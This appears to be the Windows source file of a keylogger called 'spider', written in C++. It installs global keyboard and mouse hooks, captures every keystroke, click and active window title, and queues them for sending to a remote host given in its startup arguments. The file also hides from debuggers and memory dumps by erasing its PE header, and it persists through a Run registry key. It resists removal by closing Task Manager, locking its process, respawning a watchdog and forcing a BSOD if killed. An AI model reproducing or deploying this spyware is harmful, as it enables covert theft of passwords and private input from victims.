#if defined _WIN32

#include <array>
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <ctime>
#include <Aclapi.h>
#include <Sddl.h>
#include <winternl.h>
#include <commctrl.h>
#include <tlhelp32.h>
#include "SpiderPlugin.h"
#include "MacAddr.h"

#pragma comment(lib, "ntdll.lib")

namespace spider
{
  namespace client
  {
    namespace library
    {
      std::map<std::uint32_t, KeyboardKey> SpiderPlugin::m_windowsKeyboardMap =
          {
              {VK_BACK, KeyboardKey::KB_BACKSPACE},
              {VK_TAB, KeyboardKey::KB_TAB},
              {VK_RETURN, KeyboardKey::KB_ENTER},
              {VK_CAPITAL, KeyboardKey::KB_CAPSLOCK},
              {VK_ESCAPE, KeyboardKey::KB_ESCAPE},
              {VK_SPACE, KeyboardKey::KB_SPACE},
              {VK_PRIOR, KeyboardKey::KB_PAGEUP},
              {VK_NEXT, KeyboardKey::KB_PAGEDOWN},
              {VK_END, KeyboardKey::KB_END},
              {VK_HOME, KeyboardKey::KB_HOME},
              {VK_LEFT, KeyboardKey::KB_ARROW_LEFT},
              {VK_UP, KeyboardKey::KB_ARROW_UP},
              {VK_RIGHT, KeyboardKey::KB_ARROW_RIGHT},
              {VK_DOWN, KeyboardKey::KB_ARROW_DOWN},
              {VK_DELETE, KeyboardKey::KB_DELETE},
              {0x30, KeyboardKey::KB_0},
              {0x31, KeyboardKey::KB_1},
              {0x32, KeyboardKey::KB_2},
              {0x33, KeyboardKey::KB_3},
              {0x34, KeyboardKey::KB_4},
              {0x35, KeyboardKey::KB_5},
              {0x36, KeyboardKey::KB_6},
              {0x37, KeyboardKey::KB_7},
              {0x38, KeyboardKey::KB_8},
              {0x39, KeyboardKey::KB_9},
              {0x41, KeyboardKey::KB_A_MINUS},
              {0x42, KeyboardKey::KB_B_MINUS},
              {0x43, KeyboardKey::KB_C_MINUS},
              {0x44, KeyboardKey::KB_D_MINUS},
              {0x45, KeyboardKey::KB_E_MINUS},
              {0x46, KeyboardKey::KB_F_MINUS},
              {0x47, KeyboardKey::KB_G_MINUS},
              {0x48, KeyboardKey::KB_H_MINUS},
              {0x49, KeyboardKey::KB_I_MINUS},
              {0x4A, KeyboardKey::KB_J_MINUS},
              {0x4B, KeyboardKey::KB_K_MINUS},
              {0x4C, KeyboardKey::KB_L_MINUS},
              {0x4D, KeyboardKey::KB_M_MINUS},
              {0x4E, KeyboardKey::KB_N_MINUS},
              {0x4F, KeyboardKey::KB_O_MINUS},
              {0x50, KeyboardKey::KB_P_MINUS},
              {0x51, KeyboardKey::KB_Q_MINUS},
              {0x52, KeyboardKey::KB_R_MINUS},
              {0x53, KeyboardKey::KB_S_MINUS},
              {0x54, KeyboardKey::KB_T_MINUS},
              {0x55, KeyboardKey::KB_U_MINUS},
              {0x56, KeyboardKey::KB_V_MINUS},
              {0x57, KeyboardKey::KB_W_MINUS},
              {0x58, KeyboardKey::KB_X_MINUS},
              {0x59, KeyboardKey::KB_Y_MINUS},
              {0x5A, KeyboardKey::KB_Z_MINUS},
              {0x41 | 0xFF00, KeyboardKey::KB_A},
              {0x42 | 0xFF00, KeyboardKey::KB_B},
              {0x43 | 0xFF00, KeyboardKey::KB_C},
              {0x44 | 0xFF00, KeyboardKey::KB_D},
              {0x45 | 0xFF00, KeyboardKey::KB_E},
              {0x46 | 0xFF00, KeyboardKey::KB_F},
              {0x47 | 0xFF00, KeyboardKey::KB_G},
              {0x48 | 0xFF00, KeyboardKey::KB_H},
              {0x49 | 0xFF00, KeyboardKey::KB_I},
              {0x4A | 0xFF00, KeyboardKey::KB_J},
              {0x4B | 0xFF00, KeyboardKey::KB_K},
              {0x4C | 0xFF00, KeyboardKey::KB_L},
              {0x4D | 0xFF00, KeyboardKey::KB_M},
              {0x4E | 0xFF00, KeyboardKey::KB_N},
              {0x4F | 0xFF00, KeyboardKey::KB_O},
              {0x50 | 0xFF00, KeyboardKey::KB_P},
              {0x51 | 0xFF00, KeyboardKey::KB_Q},
              {0x52 | 0xFF00, KeyboardKey::KB_R},
              {0x53 | 0xFF00, KeyboardKey::KB_S},
              {0x54 | 0xFF00, KeyboardKey::KB_T},
              {0x55 | 0xFF00, KeyboardKey::KB_U},
              {0x56 | 0xFF00, KeyboardKey::KB_V},
              {0x57 | 0xFF00, KeyboardKey::KB_W},
              {0x58 | 0xFF00, KeyboardKey::KB_X},
              {0x59 | 0xFF00, KeyboardKey::KB_Y},
              {0x5A | 0xFF00, KeyboardKey::KB_Z},
              {VK_LWIN, KeyboardKey::KB_LCMD},
              {VK_RWIN, KeyboardKey::KB_RCMD},
              {VK_NUMPAD0, KeyboardKey::KB_0},
              {VK_NUMPAD1, KeyboardKey::KB_1},
              {VK_NUMPAD2, KeyboardKey::KB_2},
              {VK_NUMPAD3, KeyboardKey::KB_3},
              {VK_NUMPAD4, KeyboardKey::KB_4},
              {VK_NUMPAD5, KeyboardKey::KB_5},
              {VK_NUMPAD6, KeyboardKey::KB_6},
              {VK_NUMPAD7, KeyboardKey::KB_7},
              {VK_NUMPAD8, KeyboardKey::KB_8},
              {VK_NUMPAD9, KeyboardKey::KB_9},
              {VK_MULTIPLY, KeyboardKey::KB_ASTERISK},
              {VK_ADD, KeyboardKey::KB_PLUS},
              {VK_SUBTRACT, KeyboardKey::KB_MINUS},
              {VK_DIVIDE, KeyboardKey::KB_SLASH},
              {VK_F1, KeyboardKey::KB_FN1},
              {VK_F2, KeyboardKey::KB_FN2},
              {VK_F3, KeyboardKey::KB_FN3},
              {VK_F4, KeyboardKey::KB_FN4},
              {VK_F5, KeyboardKey::KB_FN5},
              {VK_F6, KeyboardKey::KB_FN6},
              {VK_F7, KeyboardKey::KB_FN7},
              {VK_F8, KeyboardKey::KB_FN8},
              {VK_F9, KeyboardKey::KB_FN9},
              {VK_F10, KeyboardKey::KB_FN10},
              {VK_F11, KeyboardKey::KB_FN11},
              {VK_F12, KeyboardKey::KB_FN12},
              {VK_F13, KeyboardKey::KB_FN13},
              {VK_F14, KeyboardKey::KB_FN14},
              {VK_F15, KeyboardKey::KB_FN15},
              {VK_F16, KeyboardKey::KB_FN16},
              {VK_F17, KeyboardKey::KB_FN17},
              {VK_F18, KeyboardKey::KB_FN18},
              {VK_F19, KeyboardKey::KB_FN19},
              {VK_F20, KeyboardKey::KB_FN20},
              {VK_F21, KeyboardKey::KB_FN21},
              {VK_F22, KeyboardKey::KB_FN22},
              {VK_F23, KeyboardKey::KB_FN23},
              {VK_F24, KeyboardKey::KB_FN24},
              {VK_NUMLOCK, KeyboardKey::KB_NUMLOCK},
              {VK_SCROLL, KeyboardKey::KB_SCROLL},
              {VK_LSHIFT, KeyboardKey::KB_LSHIFT},
              {VK_RSHIFT, KeyboardKey::KB_RSHIFT},
              {VK_LCONTROL, KeyboardKey::KB_LCTRL},
              {VK_RCONTROL, KeyboardKey::KB_RCTRL},
              {VK_OEM_1, KeyboardKey::KB_SEMICOLON}, // : if shift
              {VK_OEM_PLUS, KeyboardKey::KB_PLUS},
              {VK_OEM_COMMA, KeyboardKey::KB_COMMA},    // < if shift
              {VK_OEM_MINUS, KeyboardKey::KB_MINUS},    // _ if shift
              {VK_OEM_PERIOD, KeyboardKey::KB_DOT},     // > if shift
              {VK_OEM_2, KeyboardKey::KB_SLASH},        // ? if shift
              {VK_OEM_3, KeyboardKey::KB_BACKQUOTE},    // ~ if shift
              {VK_OEM_4, KeyboardKey::KB_LEFTBRACKET},  // { if shift
              {VK_OEM_5, KeyboardKey::KB_BACKSLASH},    // | if shift
              {VK_OEM_6, KeyboardKey::KB_RIGHTBRACKET}, // } if shift
              {VK_OEM_7, KeyboardKey::KB_SIMPLEQUOTE}   // " if shift
      };

      bool SpiderPlugin::initWindows()
      {
	// Hide window
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Check if already loaded
	HANDLE hMutex = CreateMutex(NULL, FALSE, "winSp1d3r");
	if (hMutex && GetLastError() != 0)
	  {
	    return false;
	  }

#ifndef _WIN64
	// Hide current thread
	hideThreadWindows(GetCurrentThread());
#endif

	// Change image size, preventing from memory dump
	std::uint32_t NewSize = (std::rand() & 0x7777) + 0x100000;
#ifndef _WIN64
	// 32 bits
	__asm {
		mov eax, fs:[0x30] // PEB
		nop
		mov eax, [eax + 0x0c] // PEB_LDR_DATA
		nop
		nop
		mov eax, [eax + 0x0c] // InOrderModuleList
		nop
		mov ecx, NewSize
		mov dword ptr[eax + 0x20], ecx // SizeOfImage
		nop
	}
#endif

	// Remove PE header
	DWORD OldProtect = 0;

	// Get base address of module
	char *pBaseAddr = reinterpret_cast<char *>(GetModuleHandle(nullptr));
	// Change memory protection
	// Assume x86 page size
	VirtualProtect(pBaseAddr, 0x1000, PAGE_READWRITE, &OldProtect);
	// Erase the header
	std::memset(pBaseAddr, 0, 0x1000);

	// Get informations
	getInfosWindows();

	MacAddress::get(m_macAddr);

	// Register program for automatic startup
	registerProgram();

	// Prevent executable from being killed via the Task Manager
	protectTask();

	// Prevent the console from being close
	{
	  HWND  hwnd = GetConsoleWindow();
	  HMENU hmenu = GetSystemMenu(hwnd, FALSE);
	  EnableMenuItem(hmenu, SC_CLOSE, MF_GRAYED);
	}

	// Pop a BSOD if the process is killed
	setCritical();

	return true;
      }

      bool SpiderPlugin::hideThreadWindows(void *handleThread)
      {

	typedef NTSTATUS(NTAPI * pNtSetInformationThread)(HANDLE, UINT, PVOID,
	                                                  ULONG);
	if (!handleThread)
	  {
	    return false;
	  }
	// Get NtSetInformationThread
	pNtSetInformationThread NtSIT =
	    reinterpret_cast<pNtSetInformationThread>(GetProcAddress(
	        GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread"));

	// Shouldn't fail
	if (!NtSIT)
	  {
	    return false;
	  }
	// 0x11 -> HideFromDebugger
	NTSTATUS Status = NtSIT(handleThread, 0x11, 0, 0);
	return !!Status;
      }

      bool SpiderPlugin::deinitWindows()
      {
	system("pause");
	return false;
      }

      Architecture SpiderPlugin::detectArchWindows() const
      {
	// Using WinAPI types
	int is64 = 0;

	// typedef for function prototype
	typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process =
	    reinterpret_cast<LPFN_ISWOW64PROCESS>(GetProcAddress(
	        GetModuleHandle(TEXT("kernel32")), "IsWow64Process"));

	if (fnIsWow64Process)
	  {
	    if (!fnIsWow64Process(GetCurrentProcess(), &is64))
	      {
		return Architecture::BITS_UNKNOWN;
	      }
	  }
	return (is64) ? Architecture::BITS_64 : Architecture::BITS_32;
      }

      std::uint64_t SpiderPlugin::getRAMWindows() const
      {
	typedef int(WINAPI * PGMSE)(LPMEMORYSTATUSEX);
	PGMSE pGMSE = reinterpret_cast<PGMSE>(
	    GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),
	                   TEXT("GlobalMemoryStatusEx")));
	if (pGMSE)
	  {
	    MEMORYSTATUSEX mi;

	    std::memset(&mi, 0, sizeof(MEMORYSTATUSEX));
	    mi.dwLength = sizeof(MEMORYSTATUSEX);
	    if (pGMSE(&mi) == TRUE)
	      {
		return mi.ullTotalPhys / (1024ull * 1024ull);
	      }
	    pGMSE = 0;
	  }
	MEMORYSTATUS mi;

	std::memset(&mi, 0, sizeof(MEMORYSTATUS));
	mi.dwLength = sizeof(MEMORYSTATUS);
	GlobalMemoryStatus(&mi);
	return mi.dwTotalPhys / (1024ull * 1024ull);
      }

      void SpiderPlugin::getInfosWindows()
      {
	m_infos.arch = detectArchWindows();
	m_infos.os = OperatingSystem::Windows;

	SYSTEM_INFO sysInfos;
	GetNativeSystemInfo(&sysInfos);

	// Fill processor architecture informations
	switch (sysInfos.wProcessorArchitecture)
	  {
	  case PROCESSOR_ARCHITECTURE_AMD64:
	    m_infos.pArch = ProcArchitecture::AMD64;
	    break;
	  case PROCESSOR_ARCHITECTURE_ARM:
	    m_infos.pArch = ProcArchitecture::ARM;
	    break;
	  case PROCESSOR_ARCHITECTURE_IA64:
	    m_infos.pArch = ProcArchitecture::IntelItanium;
	    break;
	  case PROCESSOR_ARCHITECTURE_INTEL:
	    m_infos.pArch = ProcArchitecture::x86;
	    break;
	  default:
	    m_infos.pArch = ProcArchitecture::Unknown;
	    break;
	  }
	m_infos.pageSize = sysInfos.dwPageSize;
	m_infos.nbProc =
	    static_cast<std::uint16_t>(sysInfos.dwNumberOfProcessors);
	m_infos.ram = getRAMWindows();
      }

      void SpiderPlugin::translateKey(std::uint32_t              virtualKey,
                                      spider::client::SystemMsg &msg)
      {
	static bool shift = false;

	msg.sys.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_NONE);
	msg.sys.event.upper = 0;
	if ((virtualKey == VK_SHIFT) || (virtualKey == VK_LSHIFT) ||
	    (virtualKey == VK_RSHIFT))
	  {
	    shift = (msg.sys.event.state == SystemMsgEventState::Up) ? false
	                                                             : true;
	    return;
	  }
	if (m_windowsKeyboardMap.find(virtualKey) !=
	    m_windowsKeyboardMap.end())
	  {
	    msg.sys.event.key =
	        static_cast<std::uint32_t>(m_windowsKeyboardMap[virtualKey]);
	    if (shift)
	      {
		if (virtualKey >= 0x41 && virtualKey <= 0x5A)
		  {
		    msg.sys.event.key = static_cast<std::uint32_t>(
		        m_windowsKeyboardMap[virtualKey | 0xFF00]);
		  }
		else
		  {
		    switch (msg.sys.event.key)
		      {
		      case static_cast<std::uint32_t>(KeyboardKey::KB_1):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_EXCLAMATION);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_2):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_ATSYMBOL);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_3):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_HASHTAG);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_4):
			msg.sys.event.key =
			    static_cast<std::uint32_t>(KeyboardKey::KB_DOLLAR);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_5):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_PERCENT);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_6):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_CIRCUMFLEX);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_7):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_AMPERSAND);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_8):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_ASTERISK);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_9):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_LEFTPAREN);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_0):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_EXCLAMATION);
			break;
		      case static_cast<std::uint32_t>(
		          KeyboardKey::KB_SEMICOLON):
			msg.sys.event.key =
			    static_cast<std::uint32_t>(KeyboardKey::KB_COLON);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_EQUALS):
			msg.sys.event.key =
			    static_cast<std::uint32_t>(KeyboardKey::KB_PLUS);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_COMMA):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_INFERIOR);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_MINUS):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_UNDERSCORE);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_DOT):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_SUPERIOR);
			break;
		      case static_cast<std::uint32_t>(KeyboardKey::KB_SLASH):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_QUESTION);
			break;
		      case static_cast<std::uint32_t>(
		          KeyboardKey::KB_BACKQUOTE):
			msg.sys.event.key =
			    static_cast<std::uint32_t>(KeyboardKey::KB_TILDE);
			break;
		      case static_cast<std::uint32_t>(
		          KeyboardKey::KB_LEFTBRACKET):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_LEFTBRACE);
			break;
		      case static_cast<std::uint32_t>(
		          KeyboardKey::KB_BACKSLASH):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_VERTICALBAR);
			break;
		      case static_cast<std::uint32_t>(
		          KeyboardKey::KB_RIGHTBRACKET):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_RIGHTBRACE);
			break;
		      case static_cast<std::uint32_t>(
		          KeyboardKey::KB_SIMPLEQUOTE):
			msg.sys.event.key = static_cast<std::uint32_t>(
			    KeyboardKey::KB_DOUBLEQUOTE);
			break;
		      default:
			msg.sys.event.upper = 1;
			break;
		      }
		  }
	      }
	  }
      }

      LRESULT CALLBACK SpiderPlugin::keyboardHookWindows(int    nCode,
                                                         WPARAM wParam,
                                                         LPARAM lParam)
      {
	if (nCode == HC_ACTION)
	  {
	    spider::client::SystemMsg msg;
	    bool                      send = false;

	    msg.sys.type = SystemMsgType::EventKeyboard;
	    msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
	    std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
	    switch (wParam)
	      {
	      case WM_KEYDOWN:
		msg.sys.event.state = SystemMsgEventState::Down;
		send = true;
		break;
	      case WM_SYSKEYDOWN:
		break;
	      case WM_KEYUP:
		msg.sys.event.state = SystemMsgEventState::Up;
		send = true;
		break;
	      case WM_SYSKEYUP:
		break;
	      default:
		break;
	      }
	    if (send)
	      {
		BYTE            KeyState[256];
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT *)lParam);
		GetKeyboardState(KeyState);

		std::array<char, MAX_PATH> currentWindow;
		GetWindowTextA(GetForegroundWindow(), currentWindow.data(),
		               sizeof(currentWindow));
		std::string cur(currentWindow.data());

		extractPath(cur);
		msg.sys.currentWindow.fill(0);
		std::copy(cur.begin(), cur.end(),
		          msg.sys.currentWindow.data());
		translateKey(hooked.vkCode, msg);
		m_sendToNetwork->push(msg);
	      }
	  }
	return CallNextHookEx(NULL, nCode, wParam, lParam);
      }

      LRESULT CALLBACK SpiderPlugin::mouseHookWindows(int nCode, WPARAM wParam,
                                                      LPARAM lParam)
      {
	if (nCode == HC_ACTION)
	  {
	    bool                      getPos = false;
	    spider::client::SystemMsg msg;

	    msg.sys.type = spider::client::SystemMsgType::EventMouse;
	    msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
	    msg.sys.event.upper = 0;
	    std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
	    switch (wParam)
	      {
	      case WM_LBUTTONDOWN:
		getPos = true;
		msg.sys.event.key =
		    static_cast<std::uint32_t>(MouseButton::ButtonLeft);
		msg.sys.event.state = SystemMsgEventState::Down;
		break;
	      case WM_LBUTTONUP:
		getPos = true;
		msg.sys.event.key =
		    static_cast<std::uint32_t>(MouseButton::ButtonLeft);
		msg.sys.event.state = SystemMsgEventState::Up;
		break;
	      case WM_RBUTTONDOWN:
		getPos = true;
		msg.sys.event.key =
		    static_cast<std::uint32_t>(MouseButton::ButtonRight);
		msg.sys.event.state = SystemMsgEventState::Down;
		break;
	      case WM_RBUTTONUP:
		getPos = true;
		msg.sys.event.key =
		    static_cast<std::uint32_t>(MouseButton::ButtonRight);
		msg.sys.event.state = SystemMsgEventState::Up;
		break;
	      default:
		break;
	      }
	    if (getPos)
	      {
		std::array<char, MAX_PATH> currentWindow;
		GetWindowTextA(GetForegroundWindow(), currentWindow.data(),
		               sizeof(currentWindow));
		std::string cur(currentWindow.data());

		extractPath(cur);
		msg.sys.currentWindow.fill(0);
		std::copy(cur.begin(), cur.end(),
		          msg.sys.currentWindow.data());
		msg.sys.event.posX =
		    reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x;
		msg.sys.event.posY =
		    reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y;

		SpiderPlugin::m_sendToNetwork->push(msg);
	      }
	  }
	return CallNextHookEx(NULL, nCode, wParam, lParam);
      }

      bool SpiderPlugin::hookKeyboardWindows()
      {
	// Install global hook
	m_keyboardHookWin =
	    SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookWindows, 0, 0);
	if (!m_keyboardHookWin)
	  {
	    return false;
	  }
	return true;
      }

      bool SpiderPlugin::unHookKeyboardWindows()
      {
	// Un-install global hook
	if (m_keyboardHookWin)
	  {
	    UnhookWindowsHookEx(m_keyboardHookWin);
	  }
	m_keyboardHookWin = nullptr;
	return false;
      }

      bool SpiderPlugin::hookMouseWindows()
      {
	// Install global hook
	m_mouseHookWin = SetWindowsHookEx(WH_MOUSE_LL, mouseHookWindows, 0, 0);
	if (!m_mouseHookWin)
	  {
	    return false;
	  }
	return true;
      }

      bool SpiderPlugin::unHookMouseWindows()
      {
	// Un-install global hook
	if (m_mouseHookWin)
	  {
	    UnhookWindowsHookEx(m_mouseHookWin);
	  }
	m_mouseHookWin = nullptr;
	return false;
      }

      void SpiderPlugin::runWindows() const
      {
	MSG msg;

	checkSentinel();
	killTaskManager();
	while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
	  {
	    if (msg.message == WM_QUIT)
	      {
		break;
	      }
	    TranslateMessage(&msg);
	    DispatchMessage(&msg);
	  }
      }

      bool SpiderPlugin::isRegistered(PCWSTR pszAppName) const
      {
	HKEY  hKey = nullptr;
	LONG  lResult = 0;
	bool  fSuccess = true;
	DWORD dwRegType = REG_SZ;
	WCHAR szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult =
	    RegOpenKeyExW(HKEY_CURRENT_USER,
	                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	                  0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	  {
	    lResult = RegGetValueW(hKey, nullptr, pszAppName, RRF_RT_REG_SZ,
	                           &dwRegType, szPathToExe, &dwSize);
	    fSuccess = (lResult == 0);
	  }

	if (fSuccess)
	  {
	    fSuccess = (wcslen(szPathToExe) > 0) ? true : false;
	  }

	if (hKey != nullptr)
	  {
	    RegCloseKey(hKey);
	    hKey = nullptr;
	  }

	return fSuccess;
      }

      bool SpiderPlugin::registerForStartup(PCWSTR pszAppName,
                                            PCWSTR pathToExe, PCWSTR args)
      {
	HKEY  hKey = nullptr;
	LONG  lResult = 0;
	bool  fSuccess = true;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	WCHAR        szValue[count] = {};

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args)
	  {
	    wcscat_s(szValue, count, args);
	  }

	lResult = RegCreateKeyExW(
	    HKEY_CURRENT_USER,
	    L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr,
	    0, (KEY_WRITE | KEY_READ), nullptr, &hKey, nullptr);

	fSuccess = (lResult == 0);

	if (fSuccess)
	  {
	    dwSize = (wcslen(szValue) + 1) * 2;
	    lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ,
	                             (BYTE *)szValue, dwSize);
	    fSuccess = (lResult == 0);
	  }

	if (hKey)
	  {
	    RegCloseKey(hKey);
	    hKey = nullptr;
	  }

	return fSuccess;
      }

      void SpiderPlugin::registerProgram()
      {
	std::array<WCHAR, MAX_PATH> pathToExe;

	if (!isRegistered(L"spider"))
	  {
	    GetModuleFileNameW(nullptr, pathToExe.data(), sizeof(pathToExe));
	    registerForStartup(L"spider", pathToExe.data(),
	                       L"172.16.107.1 1337 1338");
	  }
      }

      bool SpiderPlugin::protectTask() const
      {
	HANDLE hProcess =
	    OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());

	SECURITY_ATTRIBUTES sa;
	TCHAR *             szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)"); // Deny access to
	// built-in guests
	TEXT("(D;OICI;GA;;;AN)"); // Deny access to
	// anonymous logon

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(
	        szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
	  return false;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION,
	                             sa.lpSecurityDescriptor))
	  return false;
	return true;
      }

      void SpiderPlugin::killTaskManager() const
      {
	HWND taskManager = FindWindow(nullptr, "Task Manager");
	if (taskManager)
	  {
	    PostMessage(taskManager, WM_CLOSE, static_cast<LPARAM>(0),
	                static_cast<WPARAM>(0));
	  }
      }

      void SpiderPlugin::checkSentinel() const
      {
	char const *   processName = "spider_sentinel.exe";
	bool           exists = false;
	PROCESSENTRY32 entry{};
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot =
	    CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(snapshot, &entry))
	  {
	    while (Process32Next(snapshot, &entry))
	      {
		if (!std::strcmp(entry.szExeFile, processName))
		  {
		    exists = true;
		    break;
		  }
	      }
	  }
	CloseHandle(snapshot);

	// if the process doesn't exist, start it !
	if (!exists)
	  {
	    std::wstring const env(_wgetenv(L"AppData"));
	    std::wstring const processPath =
	        env + L"\\spider\\spider_sentinel.exe";
	    STARTUPINFOW        siStartupInfo;
	    PROCESS_INFORMATION piProcessInfo;
	    std::memset(&siStartupInfo, 0, sizeof(siStartupInfo));
	    std::memset(&piProcessInfo, 0, sizeof(piProcessInfo));
	    siStartupInfo.cb = sizeof(siStartupInfo);
	    siStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	    siStartupInfo.wShowWindow = SW_HIDE;

	    if (CreateProcessW(nullptr,
	                       const_cast<LPWSTR>(processPath.c_str()), 0, 0,
	                       false,
	                       CREATE_DEFAULT_ERROR_MODE | CREATE_NO_WINDOW |
	                           DETACHED_PROCESS,
	                       0, 0, &siStartupInfo, &piProcessInfo) != false)
	      {
		/* Watch the process. */
		WaitForSingleObject(piProcessInfo.hProcess, (2 * 1000));
	      }
	  }
      }

      void SpiderPlugin::setCritical() const
      {
	typedef VOID(_stdcall * RtlSetProcessIsCritical)(
	    IN BOOLEAN NewValue,
	    OUT PBOOLEAN OldValue, // (optional)
	    IN BOOLEAN IsWinlogon);

	HANDLE                  hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL)
	  {
	    HANDLE           hToken;
	    LUID             luid;
	    TOKEN_PRIVILEGES tkprivs;
	    std::memset(&tkprivs, 0, sizeof(tkprivs));

	    if (!OpenProcessToken(GetCurrentProcess(),
	                          (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY),
	                          &hToken))
	      return;
	    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	      {
		CloseHandle(hToken);
		return;
	      }
	    tkprivs.PrivilegeCount = 1;
	    tkprivs.Privileges[0].Luid = luid;
	    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	    BOOL ret = AdjustTokenPrivileges(
	        hToken, false, &tkprivs, sizeof(tkprivs), nullptr, nullptr);
	    CloseHandle(hToken);
	    if (!ret)
	      {
		return;
	      }

	    fSetCritical = (RtlSetProcessIsCritical)GetProcAddress(
	        (HINSTANCE)hDLL, "RtlSetProcessIsCritical");
	    if (!fSetCritical)
	      return;
	    fSetCritical(1, 0, 0);
	  }
      }
    }
  }
}
#endif
